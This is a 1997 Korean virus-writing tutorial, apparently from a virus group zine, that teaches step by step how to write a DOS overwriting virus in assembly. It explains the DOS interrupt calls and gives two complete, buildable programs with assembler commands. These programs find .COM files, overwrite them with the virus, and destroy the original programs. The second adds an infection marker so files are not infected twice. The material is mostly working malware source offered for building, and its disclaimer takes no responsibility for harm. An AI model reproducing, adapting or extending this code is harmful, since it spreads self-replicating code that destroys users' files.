
 겹쳐쓰기 바이러스 만들기                                        CVC #01  97/06

----------------------------------------------------------------> Hong_gil_dong

본내용은 스탤스워리어가 쓴 것입니다
--------------------------------------------------------------
스탤스워리어의 홈페이지와 이메일 주소는 아래와 같읍니다
홈페이지: http://www.geocities.com/SiliconValley/Heights/5303
이메일주소: stealthwarrior@hotmail.com
--------------------------------------------------------------
주의사항: 본내용으로인한 어떠한 사고도 전 책임지지 않습니다
--------------------------------------------------------------

겹쳐쓰기 바이러스는 감염된 프로그램에 자신의 코드를 겹쳐쓰기때문에
감염된 프로그램은 더이상 실행을 할수가 없읍니다, 감염된 프로그램을
실행하면 바이러스가 실행이 됩니다

다음은 겹쳐쓰기 바이러스의 순서도 입니다:
  1. 감염시킬 파일를 찾읍니다
  2. 파일을 읽기 쓰기로 엽니다.
  3. 바이러스를 파일에 씁니다.
  4. 파일을 닫읍니다
  5. 종료합니다

위의 내용를 차례대로 설명을 하겠읍니다
  1. 감염 시킬 파일을 찾읍니다.
     입력:
        ah : 4eh
        cx : 파일 속성
        dx : 파일이름의 옵셋주소
        ds : 파일이름의 세그먼트 주소

     mov  ah,4eh                          ;첫번째 파일을 찾읍니다
     xor  cx,cx                           ;속성은 일반입니다.
     lea  dx,com_files                    ;저희는 .COM 파일을 찾을
     int  21h                             ;것입니다

    우리는 com_files 를 다음과 같이 정의 합니다:
     com_files: db "*.com",0

  2. 파일을 읽기 쓰기로 엽니다:
     1번의 실행결과가 DTA 로 보내어집니다
     아래는 dta에 설정된 결과값입니다
     
     0h  db 21 dup(0)                     ;사용하지 않읍니다
     15h db 00                            ;파일 속성
     16h dw 0000                          ;파일시간
     18h dw 0000                          ;파일 날짜
     1ah dd 00000000                      ;파일 크기
     1eh db 13 dup(0)                     ;파일 이름

     입력:
        ah : 3dh
        al : 00h                          ;읽기위해 파일을 엽니다
             01h                          ;쓰기위해 파일을 엽니다
             02h                          ;읽고 쓰기위해 파일을 엽니다
        dx : 파일이름의 옵셋주소
        ds : 파일이름의 세그먼트 주소

     출력:
        ax : 파일핸들

     mov  ax,3d02h                        ;읽고쓰기 위해 파일을 엽니다
     mov  dx,9eh                          ;80h+1eh=9eh
     int  21h

  3. 바이러스를 파일에 쓴다.
     input:
        ah : 40h
        bx : 파일 핸들
        cx : 쓸 바이트수
        dx : 바이러스 시작 옵셋 주소
 
        xchg bx,ax                        ;ax 와 bx 값을 교환한다.

        mov  ah,40h
        mov  cx,OFFSET vend-OFFSET vstart ;쓸 바이트수를 얻는다.
        lea  dx,start                     ;바이러스의 시작.
        int  21h

  4. 파일을 닫는다.
     입력:
        ah : 3eh
        bx : 파일 핸들

        mov  ah,3eh                       ;파일을 닫는다
        int  21h

   5.종료합니다
        int  20h

   다음은 위의 내용을 응용한 예제 프로그램입니다
-<EXAMPLE1.ASM>--------------------------------------------------------
;예제프로그램을 실행하면 현재디렉토리에 있는 com형태의 파일을 
;감염시킵니다 한가지 문제점은 자신도 감염의 대상이된다는것입니다. 
;이문제를 해결하기위 예재프로그램보다 알파벳순서가 앞선 파일이름을가진
;파일을 예제프로그램이 있는 디렉토리로 복사하면 됩니다
;컴파일명령:
; TASM EXAMPLE1.ASM
; TLINK /t EXAMPLE1.ASM
Code   Segment
       Assume CS:code,DS:code
       Org     100h
virus  proc near
vstart:mov  ah,4eh                        ;파일을 찾읍니다
       xor  cx,cx                         ; 속성은 일반
       lea  dx,com_files                  ; 형태는 com형 파일
       int  21h                           ; 
       mov  ax,3d02h                      ;파일을 읽고쓰기 형태
       mov  dx,9eh                        ;로 엽니다
       int  21h                           ; 
       xchg bx,ax                         ;ax 와 bx 값을 바꿈.
       mov  ah,40h                        ;바이러스를 파일에
       mov  cx,OFFSET vend-OFFSET vstart  ;씁니다
       lea  dx,vstart                     ; 
       int  21h                           ; 
       mov  ah,3eh                        ;파일을 닫읍니다
       int  21h                           ; 
       int  20h                           ;종료합니다
com_files:  db "*.com",0
vend   label near
virus  endp
code   ends
       end   vstart
------------------------------------------------------------------------------

앞프로그램에서는 파일이 감염됐는지 안됐는지 알수가 없읍니다.
감염여부를 알기위해 이번에는 'a'라는 감염식별자를 프로그램에 집어넣어
보겠읍니다

    vstart:
           jmp  virus
    ID db 'a'
    virus:
      ...

바이러스는 파일의 처음 4 바이트를 (jmp 와 OFFSET 3바이트, 감염식별자 1
바이트) 읽어옵니다. 그런다음 'a' 와 비교해서 감염여부를 판단합니다

아래는 순서도 입니다:
  1. 감염시킬 파일을 찾읍니다 . 없으면 종료합니다
  2. 파일을 읽기위해 엽니다.
  3. 처음 4바이트를 읽어옵니다
  4. 파일을 닫읍니다
  5. 4번째 바이트와 감염식별자를 비교합니다
     a) 만약 감염됐으면 1번으로 갑니다.
     b) 감염이 안됐으면 계속 진행합니다
  6. 파일을 읽고 쓰기 위해 엽니다
  7. 파일에 바이러스를 씁니다ile.
  8. 파일을 닫읍니다
  9. 종료합니다

이번에는 위의 순서도를 최적하 시켜보겠읍니다:
  1. 감염시킬파일을 찾고 없으면 종료합니다.
  2. 읽고 쓰기형태로 파일를 엽니다.
  3. 첫번째 4바이트를 읽어 옵니다
  4. 4번째 바이트를 감염식별자와 비교합니다
     a) 만약 감염안었으면 파일을 닫고 1번으로 갑니다.
     b) 아니면 계속 진행합니다
  5. 바이러스를 파일에 씁니다
  6. 파일을 닫읍니다
  7. 종료합니다

최적화로 2개의 단계가 삭제되었읍니다.코드를 만들때 최적화가
항상 필요합니다
다음은 순서도의 진행과정입니다:

  1.    mov  ah,4eh                       ;일치하는 첫번째 파일을 찾는다
        xor  cx,cx                        ;속성은 일반속성으로.
        lea  dx,com_files                 ;.COM 형 파일을 찾는다
        int  21h
        jc   exit                         ;파일을 못찾으면 종료한다

     com_files 은 다음과 같이 정의 합니다:
     com_files: db "*.com",0

  2.    mov  ax,3d02h                     ;파일을 읽기 쓰기로 엽니다.
        mov  dx,9eh                       ;80h+1eh=9eh
        int  21h
        xchg bx,ax                        ;ax값을 bx로 옮깁니다

  3.파일에서 처음 4바이트를 읽어옵니다

     Input:
        ah : 3fh
        bx : 파일핸들
        cx : 읽어올 바이트수
        dx : 버퍼의 옵샛주소 (파일을 읽어와 저장하느곳)

        mov  ah,3fh
        mov  cx,4
        lea  dx,bytes
        int  21h

     bytes 를 아래와 같이 정의합니다:
        bytes db ?,?,?,?

  4.읽어온 4바이트와 파일감염식별자인 a 와 비교합니다
        cmp  byte ptr [bytes+3],'a'       ;4번째가 'a' 입니까
        jnz  infect                       ;아니면 감염시킵니다
        mov  ah,4fh                       ;다음 파일을 찾읍니다

  5.    mov  ah,40h
        mov  cx,OFFSET vend-OFFSET vstart ;바이러스 크기입니다.
        lea  dx,start                     ;바이러스의 시작점입니다
        int  21h

  6.    mov  ah,3eh                       ;파일을 닫읍니다
        int  21h

  7.    int  20h

----------------------------------------------------  
  다음은 위의 내용을 이용하여 예제를 만든것입니다
<EXAMPLE2.ASM>
;컴파일명령:
; TASM /m2 EXAMPLE2.ASM
; TLINK /t EXAMPLE2.ASM

code    segment
        assume  cs:code,ds:code
        org     100h
virus   proc    near
vstart:
        jmp  first
        db   'a'                         ;감염식별자
first:  mov  ah,4eh                      ;<첫번째           
find:   xor  cx,cx                       ; ... .COM 파일을
        lea  dx,com_files                ; 찾읍니다
        int  21h                         ; 속성은 일반입니다>
        jc   exit                        ;파일이없으면 종료합니다

        mov  ax,3d02h                    ;<파일을 읽기 쓰기로
        mov  dx,9eh                      ; 엽니다>
        int  21h                         ; 
        xchg bx,ax                       ;
        mov  ah,3fh                      ;<파일의 처음4바이트를 
        mov  cx,4                        ; 읽어옵니다>
        lea  dx,bytes                    ; 
        int  21h                         ; 
        cmp  byte ptr[bytes+3],'a'       ;4번째가 'a'?
        jnz  infect                      ;아니면 감염시킵니다
        mov  ah,3eh                      ;<파일을 닫읍니다>
        int  21h                         ; 
        mov  ah,4fh                      ;<다음파일을 찾읍니다>
        jmp  find                        ; 
infect: xor  al,al                       ;<파일의 처음으로
        mov  ah,42h                      ; 이동합니다>
        xor  cx,cx                       ; 
        cwd                              ; 
        int  21h                         ;         
        mov  ah,40h                      ;<바이러스를
        mov  cx,OFFSET vend-OFFSET vstart; 파일에 씁니다>
        lea  dx,vstart                   ; 
        int  21h                         ; 
        mov  ah,3eh                      ;<파일을 닫읍니다>
        int  21h                         ; 
exit:   int  20h                         ;종료합니다
com_files db "*.com",0
bytes db ?,?,?,?
vend  label near
virus endp
code  ends
      end   vstart

--------------   끝  ---------------------------------

